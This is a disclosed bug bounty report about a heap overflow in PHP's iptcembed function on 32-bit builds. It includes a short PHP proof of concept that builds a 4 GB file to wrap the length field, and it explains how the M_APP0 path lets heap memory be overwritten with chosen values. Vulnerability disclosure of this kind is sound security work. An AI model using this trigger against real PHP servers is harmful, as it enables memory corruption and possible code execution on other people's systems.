# Trivial age-old heap overflow in 32-bit PHP

## Report Details
- **Report ID**: 112863
- **URL**: https://hackerone.com/reports/112863
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-01-26T13:06:43.154Z
- **Disclosed**: 2019-11-12T09:36:51.959Z

## Reporter
- **Username**: jbremer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Given one is able to execute a PHP file there exists a trivial heap overflow in the `ext/standard/iptc.c` module, a module which exports the `iptcembed` and `iptcparse` functions. It should be noted that the implementation of these functions is - in some countries - allowed to drink beer and get driving lessons.

Initially implemented in the good ol' [Internet bubble][impl] it has since been [patched][] as the function showed too much power to the internet as it was mastering the heap in ways not seen before. Since then [a][p0] [number][p1] [of][p2] [clear][p3] [improvements][p4] have been seen while still remaining heap master in disguise.

[impl]: https://github.com/php/php-src/commit/ad0076ee5318bba0c055c28271d6810c53db6f40#diff-98113f2c152c3d95d366989462658a39R232
[patched]: https://github.com/php/php-src/commit/ec33704c3929fc874ef434f623a58d34acfffd82
[p0]: https://github.com/php/php-src/commit/c0404f46311e5b519dc51697e181bb39ca8d09d2#diff-98113f2c152c3d95d366989462658a39L225
[p1]: https://github.com/php/php-src/commit/511463854b2ea520604ec22c0d0d80cc329727ae
[p2]: https://github.com/php/php-src/commit/cce7545d18ed7774b3938565dd1c770c9a14bbb9#diff-98113f2c152c3d95d366989462658a39L230
[p3]: https://github.com/php/php-src/commit/312181bc13d99ce089aeb16542db9f6c8a11f108
[p4]: https://github.com/php/php-src/commit/887e5ad110eb87c3969b0e7f12a2b2fd9fb9c0b0

Following is a POC that will trigger a memory corruption. For those with more time on their hands it should be obvious that this can be exploited further on 32-bit versions of PHP. Unfortunately it'd appear that, since one is not able to `ftruncate()` a `0xffffffffffffffff`-sized file on any filesystem (as far as I'm aware?), it is not possible to wraparound the 64-bit length variable that is allocated in 64-bit versions of PHP.

```php
<?php

if(file_exists("heapyolo") == 0) {
    $fp = fopen("heapyolo", "wb");

    fwrite($fp, "\xff\xd8\xff\xe0\x00\x02\x00\xd9");
    for ($i = 0; $i < 4096; $i++) {
        fwrite($fp, str_repeat("A", 1024*1024));
    }

    fclose($fp);
}

iptcembed(str_repeat("A", 1024*1024), "heapyolo");
?>
```

The POC writes a legitimate `iptc`-compatible header followed by 4 GB of data. In combination with the constant integers and length of the `iptcdata` the filesize then overflows the 32-bit length field which [is then allocated][alloc].
By using the `M_APP0` switch/case entry we're then able to overwrite heap memory with arbitrary values and arbitrary length as passed along by the `iptcdata` variable. It should be noted that this can be done multiple times - as long as PHP doesn't crash - and that we only have to write the 4GB file once due to this construct.

[alloc]: https://github.com/php/php-src/blob/master/ext/standard/iptc.c#L207

Well, that's enough The Internet for me for today. Thanks!

## Attachments
No attachments
